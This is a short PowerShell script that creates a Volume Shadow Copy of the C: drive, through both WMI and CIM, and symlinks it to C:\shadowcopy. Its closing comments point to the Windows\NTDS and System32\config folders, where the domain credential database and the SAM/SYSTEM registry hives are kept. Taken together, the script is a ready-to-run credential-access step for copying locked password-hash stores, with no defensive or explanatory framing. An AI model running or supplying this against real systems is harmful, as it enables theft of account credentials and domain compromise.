# Create shadowcopy for sensitive files

# Create Shadow Copy using WMI (legacy)

# Define the source volume to snapshot and the local directory target for the symbolic link.
$TargetVolume = "C:"
$ShadowMount = "C:\shadowcopy"

# Retrieve the WMI class definition for Win32_ShadowCopy to access its static methods.
$ShadowCopyClass = [wmiclass]"root\cimv2:Win32_ShadowCopy"

# Call the static 'Create' method to instruct the Volume Shadow Copy Service (VSS)
# to take a point-in-time snapshot. "ClientAccessible" specifies the context/visibility.
$Snapshot = $ShadowCopyClass.Create($TargetVolume, "ClientAccessible")

# ReturnValue 0 indicates successful snapshot creation.
if ($Snapshot.ReturnValue -eq 0) {

    # Query existing shadow copies to retrieve the newly generated instance matching the ShadowID
    $Shadow = Get-WmiObject Win32_ShadowCopy |
        Where-Object { $_.ID -eq $Snapshot.ShadowID }
    
    # Extract the raw kernel device path (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)
    # and append a trailing slash so mklink recognizes it as a directory path.
    $ShadowPath = $Shadow.DeviceObject + "\"

    # Check if a directory or link already exists at the mount point; remove it to avoid collisions.
    if (Test-Path $ShadowMount) {
        Remove-Item $ShadowMount -Force
    }

    # Execute the Windows command shell built-in 'mklink' with the /d flag
    # to create a directory symbolic link pointing to the shadow copy's device path.
    cmd /c "mklink /d `"$ShadowMount`" `"$ShadowPath`""
    
    Write-Host "Shadow copy mounted at $ShadowMount"
}
else {
    # If ReturnValue is non-zero, output the error code (e.g., access denied, provider error).
    Write-Host "Failed to create shadow copy. Error code: $($Snapshot.ReturnValue)"
}

# Create Shadow Copy using CIM (modern PowerShell)

# Re-declare configuration variables for the CIM approach.
$TargetVolume = "C:"
$ShadowMount = "C:\shadowcopy"

# Invoke the static Create method on Win32_ShadowCopy via CIM cmdlets rather than WMI wrappers.
$Snapshot = Invoke-CimMethod `
    -ClassName Win32_ShadowCopy `
    -MethodName Create `
    -Arguments @{
        Volume = $TargetVolume
        Context = "ClientAccessible"
    }

# Retrieve the CIM instance corresponding to the returned ShadowID.
$Shadow = Get-CimInstance Win32_ShadowCopy |
    Where-Object { $_.ID -eq $Snapshot.ShadowID }

# Obtain the DeviceObject string representing the snapshot device and append the trailing slash.
$ShadowPath = $Shadow.DeviceObject + "\"

# Create the directory symbolic link to make the raw device accessible via standard file paths.
cmd /c "mklink /d `"$ShadowMount`" `"$ShadowPath`""

# After mounting, access files through:

# C:\shadowcopy\Windows\NTDS\
# C:\shadowcopy\Windows\System32\config\
